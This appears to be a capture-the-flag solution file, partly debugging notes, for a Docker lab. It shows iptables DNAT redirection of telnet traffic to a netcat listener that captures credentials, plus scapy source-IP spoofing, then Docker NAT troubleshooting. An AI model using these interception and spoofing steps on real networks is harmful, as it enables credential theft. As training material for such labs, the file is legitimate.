@@ -1,0 +1,87 @@
+### SPOILER ALERT ###
+
+# This is just one possible way of solving this challenge.
+# And actually it turns out the second half of the challenge is unsolvable because of docker weirdness
+# So this document kind of turns into debugging notes
+
+## Attacker
+# Notice SYN's and RST's for telnet/23.  Let's give it something to connect to...
+tcpdump -ni any
+
+man iptables
+man iptables-extensions
+/DNAT
+
+# Place our address translation rule and then watch the counter for how many packets hit the rule
+iptables -t nat -A PREROUTING -s 172.22.1.14 -d 172.22.0.8  -p tcp --dport 23 -j DNAT --to-destination 172.22.0.254:8023
+iptables -t nat -vnL
+
+# Yum, credentials.  Now how are we going to use them if the port is closed?
+nc -lp 8023 >> captured.txt &
+
+# We'll need to find the right source IP, based on the hint in the email
+pkts = [Ether()/IP(src=f'172.22.1.{x}', dst='172.22.0.8')/TCP(dport=23) for x in range(1,254)]
+results = srp(pkts, iface='eth1')
+
+
+## Part 2 - the broken half
+
+# A long-running issue I had was in not scapy-ing properly.  I was using send() which is layer 3 rather than sendp() layer 2.  
+# This meant that the interface I was specifying with iface= was being partially ignored, because the kernel still had to
+# resolve the Ethernet headers, so it was using ARP, which was shooting out an interface determined by the routing table.  
+
+# Shenanigans
+# Either the docker bridge driver or its IPAM driver is recognizing that the source IP is within range, but 
+# doesn't belong to that host, so it NAT's it to itself (anti-spoofing?) interestingly it doesn't do this for
+# IP netblocks it isn't aware of.  It does it based on source IP, even for destination netblocks that don't exist.  
+>>> sendp(Ether()/IP(src='1.1.1.1', dst='172.22.0.8')/TCP(dport=23), iface='eth1')
+>>> sendp(Ether()/IP(src='172.22.1.15', dst='172.22.0.8')/TCP(dport=23), iface='eth1')
+>>> sendp(Ether()/IP(src='172.22.7.15', dst='172.22.0.8')/TCP(dport=23), iface='eth1')
+>>> sendp(Ether()/IP(src='172.22.1.15', dst='172.22.7.8')/TCP(dport=23), iface='eth1')
+
+22:41:31.807729 02:42:ac:16:00:fe > 02:42:ac:16:00:08, ethertype IPv4 (0x0800), length 54: 1.1.1.1.20 > 172.22.0.8.23: Flags [S], seq 0, win 8192, length 0
+22:41:31.807771 02:42:ac:16:00:08 > 02:42:15:8d:5f:2b, ethertype IPv4 (0x0800), length 54: 172.22.0.8.23 > 1.1.1.1.20: Flags [R.], seq 0, ack 1, win 0, length 0
+22:41:51.473351 02:42:ac:16:00:fe > 02:42:ac:16:00:08, ethertype IPv4 (0x0800), length 54: 172.22.0.1.20 > 172.22.0.8.23: Flags [S], seq 0, win 8192, length 0
+22:41:51.473374 02:42:ac:16:00:08 > 02:42:15:8d:5f:2b, ethertype IPv4 (0x0800), length 54: 172.22.0.8.23 > 172.22.0.1.20: Flags [R.], seq 0, ack 1, win 0, length 0
+22:43:24.459858 02:42:ac:16:00:fe > 02:42:ac:16:00:08, ethertype IPv4 (0x0800), length 54: 172.22.7.15.20 > 172.22.0.8.23: Flags [S], seq 0, win 8192, length 0
+22:43:24.459878 02:42:ac:16:00:08 > 02:42:15:8d:5f:2b, ethertype IPv4 (0x0800), length 54: 172.22.0.8.23 > 172.22.7.15.20: Flags [R.], seq 0, ack 1, win 0, length 0
+22:44:59.886425 02:42:c0:a8:00:0a > 02:42:eb:20:45:05, ethertype IPv4 (0x0800), length 54: 172.22.0.1.20 > 172.22.7.8.23: Flags [S], seq 0, win 8192, length 0
+
+# Manually attaching veth's should work perfectly fine
+
+# I also want to try turning off IPAM for the network, or one of the following ideas:
+TODO: try macvlan driver with --internal, manually attaching
+TODO: try removing IP from docker compose replace with {} so maybe it won't know what you're supposed to be
+TODO: manually attach veth's to running containers'
+    driver_opts
+    Specify a list of options as
+    networks:
+        internal: true
+    networks:
+        outside:
+            external: true
+                name: actual_name
+    network_mode
+    Network mode. Use the same values as the docker client --network parameter, plus the special form service:[service name].
+    network_mode: "container:[container name/id]"
+    network_made: "none"
+
+
+# Alright, so I tried the none IPAM driver and same issue with NAT'ing during spoofing occurs
+# next idea is using the manual veth connections, which should work.  
+# But it doesn't, because of all docker's crazy iptables rules.  
+# ICMP was getting blocked, so I put in an accept rule for br_jimmy
+# This finally let ICMP through, but now the source IP was being NAT'ed to 10.0.2.15, the IP of the host's 
+# physical ethernet interface enp0s3 !   craziness.  gotta look more into iptables NAT'ing going on 
+./veth_connect.sh intercept-attacker-1 172.22.0.254/24 - br_jimmy
+./veth_connect.sh intercept-netadmin-1 172.22.0.8/24 - br_jimmy
+
+iptables -I FORWARD --in-interface br_jimmy -j ACCEPT
+iptables -I FORWARD --out-interface br_jimmy -j ACCEPT
+iptables -nvL | head
+iptables -t nat -nvL
+
+# Sure enough, crazy MASQUERADEs and DNATs.  TODO: Need a minimal setup to understand what it's doing
+# I think that's the key here.  Probably docker's bridge driver isn't doing magic, rather it's implementing
+# a ton of crazy iptables rules, which is what's causing the weird behavior.  
+
